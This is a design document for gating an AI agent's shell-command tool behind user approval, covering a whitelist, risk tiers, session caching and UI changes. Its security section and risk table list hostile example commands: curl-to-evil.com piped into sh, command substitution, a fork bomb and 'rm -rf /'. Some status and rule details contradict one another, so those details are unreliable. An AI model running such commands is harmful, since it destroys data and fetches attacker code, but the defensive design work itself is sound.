# Command Execution Permission Control Implementation

## Overview

This document describes the implementation plan for adding permission control to command execution in the agent filesystem handler tool. The system currently allows commands to execute without user approval, which poses security risks. This document outlines a complete implementation with granular permission control based on command content, risk assessment, and session-based approval caching.

## Current System Analysis

### Existing Permission Flow
- Permissions are MCP server-based & persistent (stored in config)
- UI shows "Allow" + "Remember this choice" checkbox
- Permission types: `read`, `write`, `all`
- Handler: `PermissionHandler` in `threadPresenter/handlers`
- Persistence: Stored in server configuration, persists across app restarts

### Command Execution Flow
- Tool: `execute_command` in `AgentFileSystemHandler.executeCommand()` (line 1103)
- Called via: `AgentToolManager.callFileSystemTool()` (line 478)
- **Currently bypasses permission control** - commands execute immediately
- Only protection: Workspace directory boundaries (already enforced by filesystem handler)

### Security Concerns
1. No user approval before executing arbitrary shell commands
2. No visibility into what commands are being executed
3. No ability to prevent dangerous operations (deletions, network access, etc.)
4. Session-based control not enforced (once approved, always approved in old MCP model)

## Implementation Plan

### Core Components

#### 1. Command Permission Handler
Create `src/main/presenter/threadPresenter/handlers/commandPermissionHandler.ts`

**Responsibilities:**
- Manage command whitelist (safe commands that don't need approval)
- Session-based permission cache (in-memory)
- Command signature extraction
- Risk assessment algorithm

**Whitelist Examples:**
```typescript
const SAFE_COMMANDS = new Set([
  'ls', 'pwd', 'echo', 'cat', 'head', 'tail', 'wc',
  'grep', 'diff', 'find', 'sort', 'uniq'
])
```

**Session Cache Structure:**
```typescript
Map<conversationId, Set<commandSignature>>
```
- Key: conversation ID
- Value: Set of approved command signatures
- Lifetime: Memory-only, cleared on app restart/conversation close

#### 2. Middleware in executeCommand Flow
Modify `AgentFileSystemHandler.executeCommand()`:

**Changes:**
- Parse command to extract base command (first word before args)
- Check whitelist → if approved, execute directly
- Check session cache → if approved for this conversation, execute
- Otherwise, emit permission request event with command metadata

**Signature Format:**
```typescript
// "npm install" → signature: "npm install"
// "git pull origin main" → signature: "git pull"
// Extract first 2-3 words for signature
```

#### 3. Permission Flow Integration
Update `ToolCallHandler.processToolCallStart()`:

**Detection Logic:**
- Detect `execute_command` tool call
- Check with `CommandPermissionHandler` if approval needed
- If needed, create permission request block with `permissionType = 'command'`
- Include command metadata: base command, full command, risk level, suggestions

#### 4. UI Enhancement for MessageBlockPermissionRequest.vue

**New Props & State:**
```typescript
const isCommandPermission = computed(() =>
  props.block.extra?.permissionType === 'command'
)
const commandInfo = computed(() =>
  JSON.parse(props.block.extra?.commandInfo || '{}')
)
```

**New Button Layout:**
Replace current single "Allow" button with:
- **Deny**: Refuse to execute
- **Allow Once**: Execute this command only (no caching)
- **Allow for Session**: Auto-approve this command signature for entire conversation

**Visual Design:**
```
[⚠️] Execute Command
        └─ npm install react

[Risk: Medium] This command will install packages
            Suggestion: Review package list

┌─────────────────────────────────────────┐
│  [Deny]  [Allow Once]  [Allow for Session] │
└─────────────────────────────────────────┘
```

#### 5. Permission Types & i18n Updates

**Add New Permission Type:**
```typescript
type PermissionType = 'read' | 'write' | 'all' | 'command'
```

**i18n Structure (example for zh-CN):**
```json
{
  "messageBlockPermissionRequest": {
    "type": {
      "read": "读取权限",
      "write": "写入权限",
      "all": "完全权限",
      "command": "执行命令"
    },
    "description": {
      "command": "执行命令: {command}",
      "commandWithRisk": "执行命令: {command}\n\n风险等级: {riskLevel}\n\n建议: {suggestion}"
    },
    "deny": "拒绝",
    "allowOnce": "允许一次",
    "allowForSession": "当前会话自动执行",
    "granted": "权限已授予",
    "denied": "权限已拒绝"
  }
}
```

### Risk Assessment Algorithm

**Risk Levels:**
```typescript
enum CommandRisk {
  LOW = 'low',      // ls, pwd, echo, cat - harmless read-only
  MEDIUM = 'medium', // git pull, npm install - potential side effects
  HIGH = 'high',    // rm -rf, sudo, docker run - dangerous operations
  CRITICAL = 'critical' // network access, file deletion, privileged ops
}
```

**Risk Classification Rules:**

| Risk | Pattern Examples | Reason |
|------|------------------|--------|
| LOW | `ls`, `pwd`, `echo`, `cat`, `head`, `tail`, `wc` | Read-only, no side effects |
| LOW | `grep`, `diff`, `sort`, `uniq` | Read-only operations |
| MEDIUM | `git pull`, `git push`, `git checkout` | Can modify code |
| MEDIUM | `npm install`, `pip install`, `cargo build` | External package installation |
| MEDIUM | `make`, `npm build`, `npm test` | Build/test operations |
| HIGH | `rm`, `rmdir`, `mv` (with paths) | File manipulation |
| HIGH | `sudo`, `doas`, `su` | Privilege escalation |
| HIGH | `docker`, `podman`, `kubectl` | Container/orchestration ops |
| CRITICAL | `rm -rf`, `:(){:|:&};:` (fork bomb), `chmod 777 /` | Destructive/attack patterns |
| CRITICAL | `curl`, `wget`, `nc`, `telnet` | Network access (data exfiltration risk) |
| CRITICAL | No arguments to dangerous commands | Ambiguous dangerous command (e.g. `rm` without args) |

**Implementation:**
```typescript
function assessCommandRisk(command: string): {
  level: CommandRisk,
  suggestion: string
} {
  // 1. Check for critical patterns first
  if (DESTRUCTIVE_PATTERN.test(command)) {
    return {
      level: CommandRisk.CRITICAL,
      suggestion: 'This operation is destructive and may delete important files.'
    }
  }

  // 2. Check for network access
  if (NETWORK_PATTERN.test(command)) {
    return {
      level: CommandRisk.CRITICAL,
      suggestion: 'This command will access external networks. Verify the URL and intent.'
    }
  }

  // 3. Check for shell variables/command chaining attacks
  if (CHAINING_PATTERN.test(command)) {
    return {
      level: CommandRisk.CRITICAL,
      suggestion: 'Invalid command format or potential injection detected.'
    }
  }

  // 4. Check base command against whitelist
  const baseCmd = extractBaseCommand(command)
  if (SAFE_COMMANDS.has(baseCmd)) {
    return {
      level: CommandRisk.LOW,
      suggestion: 'Safe read-only operation.'
    }
  }

  // 5. Check against medium/high risk patterns
  if (RISKY_COMMANDS.test(command)) {
    return {
      level: CommandRisk.HIGH,
      suggestion: 'This command modifies files or system state. Review carefully.'
    }
  }

  if (BUILD_COMMANDS.test(command)) {
    return {
      level: CommandRisk.MEDIUM,
      suggestion: 'This command installs packages or builds code. Verify dependencies.'
    }
  }

  // 6. Default to medium for unknown commands
  return {
    level: CommandRisk.MEDIUM,
    suggestion: 'Review the command before execution.'
  }
}
```

### Session Permission Cache

**Cache Lifecycle:**
- Created: When conversation starts
- Updated: User approves a command with "Allow for Session"
- Cleared: When conversation closes OR app restarts
- Scope: Per-conversation, in-memory only

**API:**
```typescript
class CommandPermissionCache {
  private cache = new Map<string, Set<string>>()

  /**
   * Approve a command signature
   * @param conversationId - Current conversation
   * @param signature - Command signature (e.g. "npm install")
   * @param isSession - If true, cache for session; false, no caching
   */
  approve(conversationId: string, signature: string, isSession: boolean): void

  /**
   * Check if a command is already approved
   */
  isApproved(conversationId: string, signature: string): boolean

  /**
   * Clear cache for a specific conversation
   * Called when conversation closes
   */
  clearConversation(conversationId: string): void

  /**
   * Clear all cached permissions
   * Called on app shutdown
   */
  clearAll(): void
}
```

**Integration Points:**
1. App lifecycle: Listen for `app.on('before-quit')` → `clearAll()`
2. Conversation lifecycle: Hook into `closeConversation` → `clearConversation(conversationId)`
3. Memory safety: Weak references or explicit cleanup to prevent memory leaks

### Workflow Changes

```
LLM calls execute_command tool
  ↓
AgentToolManager.callFileSystemTool('execute_command', args)
  ↓
FileSystemHandler.executeCommand(args)
  ↓  (NEW: Before execution)
CommandPermissionHandler.checkPermission(conversationId, command)
  ↓
  ├─ In whitelist? → YES: Execute directly
  ├─ In session cache? → YES: Execute directly
  └─ NOT approved?
      ↓
      NEW: Emit permission request event
          type: 'tool_call_permission'
          tool_name: 'execute_command'
          permissionType: 'command'
          commandInfo: {
            command: 'npm install react',
            riskLevel: 'medium',
            suggestion: 'This command will install packages'
          }
          needsUserAction: true
      ↓
  PermissionHandler.processToolCallPermission()
      ↓
  MessageBlockPermissionRequest.vue renders with command UI
      ↓
  User clicks button:
      ├─ Deny → Block execution, send error to LLM
      ├─ Allow Once → Execute once (no caching)
      └─ Allow for Session → Update cache + Execute
          ↓
      CommandPermissionCache.approve(conversationId, signature, true)
              ↓
          Execute command via FileSystemHandler
              ↓
          Emit tool_call_end event with results
              ↓
          Continue agent loop
```

## Detailed TODO Checklist

### Phase 1: Core Permission Handler (Priority: HIGH)
- [x] Create `src/main/presenter/threadPresenter/handlers/commandPermissionHandler.ts`
  - [x] Define `CommandRisk` enum and constants
  - [x] Implement `CommandPermissionCache` class
    - [x] `approve(conversationId, signature, isSession)` method
    - [x] `isApproved(conversationId, signature)` method
    - [x] `clearConversation(conversationId)` method
    - [x] `clearAll()` method
  - [x] Implement `CommandPermissionHandler` class
    - [x] Define `SAFE_COMMANDS` whitelist
    - [x] Implement `assessCommandRisk(command)` function
    - [x] Implement `extractCommandSignature(command)` function
    - [x] Implement `checkPermission(conversationId, command)` method
- [x] Add unit tests for `CommandPermissionHandler`
  - [x] Test risk assessment with various commands
  - [x] Test signature extraction
  - [x] Test cache operations
  - [x] Test whitelist checks

### Phase 2: Integrate Permission Check (Priority: HIGH)
- [x] Modify `src/main/presenter/llmProviderPresenter/agent/agentFileSystemHandler.ts`
  - [x] Import `CommandPermissionHandler` in `AgentToolManager`
  - [x] Modify `executeCommand()` method
    - [x] Add permission check before execution
    - [x] Return early if approved (whitelist or cache)
    - [x] Throw permission required error if not approved
  - [x] Add conversationId parameter to `executeCommand()` (already present)
- [x] Update `src/main/presenter/llmProviderPresenter/agent/agentToolManager.ts`
  - [x] Inject `CommandPermissionHandler` into constructor
  - [x] Pass `conversationId` to `executeCommand()` calls
  - [x] Catch permission errors and convert to permission request events
- [x] Ensure agent loop uses the shared ToolPresenter with command permission injection
  - [x] Prefer `presenter.toolPresenter` inside `AgentLoopHandler`

### Phase 3: Agent Loop Integration (Priority: HIGH)
- [x] Modify `src/main/presenter/threadPresenter/handlers/toolCallHandler.ts`
  - [x] Add detection for `execute_command` tool
  - [x] Call `CommandPermissionHandler.assessCommandRisk()` when creating permission block
  - [x] Add `commandInfo` to `extra` field with:
    - [x] `command`: Full command string
    - [x] `riskLevel`: Risk assessment result
    - [x] `suggestion`: User-friendly warning message
  - [x] Set `permissionType: 'command'` in extra field
- [x] Update `src/main/presenter/llmProviderPresenter/managers/toolCallProcessor.ts`
  - [x] Handle permission requests from filesystem tools
  - [x] Convert permission errors to `permission-required` events

### Phase 4: Permission Handler Updates (Priority: HIGH)
- [x] Modify `src/main/presenter/threadPresenter/handlers/permissionHandler.ts`
  - [x] Import `CommandPermissionHandler` and `CommandPermissionCache`
  - [x] Extend `handlePermissionResponse()` to handle `command` permission type
    - [x] Parse `commandInfo` from block extra
    - [x] Call `CommandPermissionCache.approve()` if `remember` is true
    - [x] Restart agent loop after approval
  - [x] Add `clearConversation()` hook to conversation close events
  - [x] Add `clearAll()` to app lifecycle events
- [x] Allow cached approvals to bypass critical-risk gating
- [x] Update `src/shared/chat.d.ts` (optional: types are currently loose)
  - [x] Add `'command'` to a `PermissionType` union type and tighten `extra` typings if desired

### Phase 5: UI Component Enhancement (Priority: MEDIUM)
- [x] Modify `src/renderer/src/components/message/MessageBlockPermissionRequest.vue`
  - [x] Add computed properties
    - [x] `isCommandPermission`
    - [x] `commandInfo`
    - [x] `riskLevel`
    - [x] `displayCommand`
  - [x] Add UI elements for command permissions
    - [x] Command display area with syntax highlighting (if possible)
    - [x] Risk level badge with color coding
    - [x] Suggestion/help text
  - [x] Replace button layout for command permissions
    - [x] Keep single "Deny" button
    - [x] Split "Allow" into two buttons: "Allow Once" and "Allow for Session"
    - [x] Add tooltips explaining the difference
  - [x] Update template logic to render command-specific UI
  - [x] Add CSS/animations for risk level indicators

### Phase 6: i18n Updates (Priority: MEDIUM)
- [x] Update all locale files with new i18n keys:
  - [x] `src/renderer/src/i18n/en-US/components.json`
  - [x] `src/renderer/src/i18n/zh-CN/components.json`
  - [x] `src/renderer/src/i18n/ja-JP/components.json`
  - [x] `src/renderer/src/i18n/fr-FR/components.json`
  - [x] `src/renderer/src/i18n/da-DK/components.json`
  - [x] `src/renderer/src/i18n/ru-RU/components.json`
- [x] Add keys for each locale:
  - [x] `messageBlockPermissionRequest.type.command`
  - [x] `messageBlockPermissionRequest.description.command`
  - [x] `messageBlockPermissionRequest.description.commandWithRisk`
  - [x] `messageBlockPermissionRequest.allowOnce`
  - [x] `messageBlockPermissionRequest.allowForSession`
  - [x] Risk level labels (low, medium, high, critical)
  - [x] Suggestion messages for each risk level
- [x] Update TypeScript i18n types
  - [x] `src/types/i18n.d.ts`

### Phase 7: App Lifecycle Integration (Priority: MEDIUM)
- [x] Update `src/main/presenter/threadPresenter/index.ts`
  - [x] Initialize `CommandPermissionHandler` in constructor
  - [x] Pass handler to `PermissionHandler`
  - [x] Listen for conversation close events
  - [x] Clear conversation cache on close
- [x] Update `src/main/index.ts` (app entry point)
  - [x] Add event listener for `app.on('before-quit')`
  - [x] Call `CommandPermissionCache.clearAll()`
  - [x] Add similar logic for `app.on('window-all-closed')`

### Phase 8: Testing (Priority: HIGH)
- [ ] Write unit tests for permission workflow
  - [x] `test/main/presenter/threadPresenter/commandPermissionHandler.test.ts`
    - [x] Test low-risk commands (ls, cat) → auto-approve
    - [x] Test medium-risk commands (npm install) → require approval
    - [x] Test high-risk commands (rm -rf) → require approval + critical warning
    - [x] Test cache operations (approve, check, clear)
    - [x] Test signature extraction variations
  - [ ] `test/main/presenter/threadPresenter/permissionHandler.test.ts`
    - [ ] Test command permission response handling
    - [ ] Test session vs one-time approval
    - [ ] Test permission denied flow
- [ ] Write integration tests
  - [ ] Test full flow from tool call to execution
  - [ ] Test cache clearing on conversation close
  - [ ] Test cache clearing on app restart
- [ ] Write UI component tests
  - [ ] `test/renderer/components/message/MessageBlockPermissionRequest.test.ts`
    - [ ] Test component renders with permission type 'command'
    - [ ] Test command info extraction
    - [ ] Test risk level badge display
    - [ ] Test button click handlers (deny, allow once, allow for session)
    - [ ] Test i18n translation

### Phase 9: Documentation (Priority: LOW)
- [ ] Update user documentation
  - [ ] Add section on command execution permissions
  - [ ] Explain risk levels and suggestions
  - [ ] Explain "Allow Once" vs "Allow for Session"
  - [ ] Document command whitelist
- [ ] Update developer documentation
  - [ ] Document permission handler architecture
  - [ ] Document how to add commands to whitelist
  - [ ] Document risk assessment rules
  - [ ] Document session cache lifecycle

### Phase 10: Code Quality (Priority: LOW)
- [ ] Run linter and fix issues
  ```bash
  pnpm run lint
  ```
- [ ] Run TypeScript type checker
  ```bash
  pnpm run typecheck
  ```
- [ ] Format code
  ```bash
  pnpm run format
  ```
- [ ] Add error handling edge cases
  - [ ] Malformed command strings
  - [ ] Empty commands
  - [ ] Unicode/command injection attempts
  - [ ] Cache corruption scenarios

## Files to Modify

### New Files
- [x] `src/main/presenter/threadPresenter/handlers/commandPermissionHandler.ts`
- [x] `test/main/presenter/threadPresenter/commandPermissionHandler.test.ts`

### Modified Files - Main Process
- [x] `src/main/presenter/threadPresenter/index.ts`
  - Initialize permission cache handler
  - Pass to child handlers
- [x] `src/main/presenter/threadPresenter/handlers/permissionHandler.ts`
  - Handle command permission responses
  - Manage cache lifecycle
- [x] `src/main/presenter/threadPresenter/handlers/toolCallHandler.ts`
  - Detect command tools
  - Create permission blocks with command info
- [x] `src/main/presenter/llmProviderPresenter/agent/agentFileSystemHandler.ts`
  - Add permission check before executing commands
- [x] `src/main/presenter/llmProviderPresenter/agent/agentToolManager.ts`
  - Inject permission handler
  - Pass conversation ID
- [x] `src/main/presenter/llmProviderPresenter/managers/agentLoopHandler.ts`
  - Reuse shared ToolPresenter for permissions

### Modified Files - Renderer
- [x] `src/renderer/src/components/message/MessageBlockPermissionRequest.vue`
  - Add command-specific UI
  - Multiple allow buttons
  - Risk level indicators

### Modified Files - Types
- [x] `src/shared/chat.d.ts` (optional: types are currently loose)
  - Add `'command'` to permission types if you introduce a `PermissionType` type
  - Add command info to extra field types if you want stricter typing

### Modified Files - i18n
- [x] `src/renderer/src/i18n/en-US/components.json`
- [x] `src/renderer/src/i18n/zh-CN/components.json`
- [x] `src/renderer/src/i18n/ja-JP/components.json`
- [x] `src/renderer/src/i18n/fr-FR/components.json`
- [x] `src/renderer/src/i18n/da-DK/components.json`
- [x] `src/renderer/src/i18n/ru-RU/components.json`
- [ ] `src/renderer/src/i18n/fr-FR/components.json`
- [ ] `src/renderer/src/i18n/da-DK/components.json`
- [ ] `src/renderer/src/i18n/ru-RU/components.json`
- [ ] `src/types/i18n.d.ts`

### Modified Files - Tests
- [ ] `test/main/presenter/threadPresenter/permissionHandler.test.ts`
- [ ] `test/renderer/components/message/MessageBlockPermissionRequest.test.ts`

### Modified Files - App Entry
- [ ] `src/main/index.ts`
  - Add app lifecycle hooks for cache cleanup

## Example Use Cases

### Case 1: Safe Command (Auto-Approved)
```
User: "List all files in the project"
LLM: Calls execute_command("ls -la")

Flow:
1. Command extracted: "ls"
2. Whitelist check: "ls" is in SAFE_COMMANDS
3. Result: Execute directly, no UI shown
```

### Case 2: Medium Risk Command (First Time)
```
User: "Install React for the frontend"
LLM: Calls execute_command("npm install react")

Flow:
1. Command extracted: "npm install"
2. Whitelist check: Not in whitelist
3. Session cache check: Not approved
4. Risk assessment: MEDIUM (package installation)
5. Permission UI shown:
   ⚠️ Execute Command
   └─ npm install react

   [Risk: Medium] This command will install packages
   Suggestion: Review package list

   [Deny] [Allow Once] [Allow for Session]

6. User clicks "Allow Once"
7. Command executes, result returned to LLM
8. Next "npm install" in same conversation → UI shown again
```

### Case 3: Medium Risk Command (Session Cache)
```
User: "Install other npm packages"
LLM: Calls execute_command("npm install lodash")

Flow:
1. Command extracted: "npm install"
2. Session cache check: "npm install" is approved (from previous session)
3. Result: Execute directly, no UI shown

Cache entry:
conversationId: "abc-123"
signature: "npm install"
approved: true
```

### Case 4: High Risk Command
```
User: "Clean up the node_modules folder"
LLM: Calls execute_command("rm -rf node_modules")

Flow:
1. Command extracted: "rm"
2. Whitelist check: Not in whitelist
3. Risk assessment: HIGH (file deletion)
4. Permission UI shown with warning:
   🚨 Execute Command
   └─ rm -rf node_modules

   [Risk: High] This command deletes files
   Suggestion: Verify paths carefully

   [Deny] [Allow Once] [Allow for Session]

5. User denies → Error sent to LLM
```

### Case 5: Critical Risk Command
```
User: "Delete everything in the project"
LLM: Calls execute_command("rm -rf /")

Flow:
1. Command extracted: "rm -rf /"
2. Risk assessment: CRITICAL (destructive)
3. Permission UI shown with strong warning:
   ⛔ Dangerous Command
   └─ rm -rf /

   [Risk: Critical] This operation is destructive and may delete important files.
   Suggestion: Cancel and review the request

   [Deny] [Allow Once] (Allow for Session disabled for critical)

4. User denies (recommended)
```

### Case 6: Session Cache Lifecycle
```
Conversation A:
- User approves "git pull" with "Allow for Session"
- Subsequent git push, git fetch → auto-approved
- User closes Conversation A
- Cache cleared for Conversation A

Conversation B:
- "git pull" → UI shown again (different conversation)
- User approves with "Allow for Session"

App Restart:
- All session caches cleared
- Any command requires approval again
```

## Security Considerations

### Command Injection Prevention
The system must prevent command injection attacks. Example attacks:
- `ls ; rm -rf /` (command chaining)
- `npm install && curl evil.com | sh` (command chaining)
- `$(curl evil.com)` (command substitution)
- `` `whoami` `` (backtick command substitution)

**Mitigation:**
1. Detect and flag chaining patterns (`;`, `&&`, `||`, `|`, `>`, `>>`)
2. Detect and flag command substitution (`$()`, backticks)
3. Display full command to user for review
4. Risk level set to CRITICAL for potential injection

### Whitelist Management
- Initially conservative whitelist
- User can request additions via issues
- Review process for whitelist additions
- Consider community whitelist (configurable)

### Session Cache Scope
- Per-conversation only (not global)
- Cleared on app restart
- Cleared on conversation close
- No persistence to disk (security feature)

### Audit Trail (Future Enhancement)
Consider adding logging for command executions:
- Who approved (user)
- When approved
- Command executed
- Result/exit code
- Risk level

## Implementation Notes

### Backward Compatibility
- Existing MCP permission flow remains unchanged
- Command permissions are additive, not replacing
- No breaking changes to APIs
- UI gracefully degrades for non-command permissions

### Performance
- Cache checks are O(1) Map/Set operations
- Risk assessment is regex-based, fast for typical commands
- No disk I/O for cache operations
- Memory footprint: ~1KB per approved signature

### Error Handling
```typescript
// Permission required error
throw new PermissionRequiredError({
  command: args.command,
  riskLevel: 'medium',
  suggestion: 'User approval required'
})

// Denied by user error
throw new PermissionDeniedError({
  command: args.command,
  reason: 'User denied permission'
})
```

### Testing Strategy
1. **Unit Tests**: Test each component in isolation
   - Risk assessment
   - Cache operations
   - Signature extraction

2. **Integration Tests**: Test end-to-end flow
   - Tool call → permission request → approval → execution

3. **UI Tests**: Test component rendering and interactions
   - Snapshot tests
   - Event handler tests

4. **Security Tests**: Test prevention of attacks
   - Command injection attempts
   - Cache poisoning
   - Unauthorized cache clearing

## Success Criteria

### Functional Requirements
- ✅ All `execute_command` calls require approval unless whitelisted
- ✅ User can choose one-time or session approvals
- ✅ Session cache cleared on app restart/conversation close
- ✅ Risk assessment displayed to user
- ✅ Dangerous commands trigger strong warnings

### Non-Functional Requirements
- ✅ Performance: < 10ms overhead for permission checks
- ✅ Memory: < 10MB for all conversation caches
- ✅ Security: No command execution without proper approval
- ✅ User Experience: Clear, intuitive permission UI
- ✅ i18n: Fully translated to all supported languages

### Testing
- ✅ 90%+ code coverage for new code
- ✅ All existing tests still pass
- ✅ Integration tests cover happy path
- ✅ Security tests prevent injection attacks

---

## Status

Last Updated: December 30, 2025
Document Version: 1.0
Implementation Status: **Not Started**
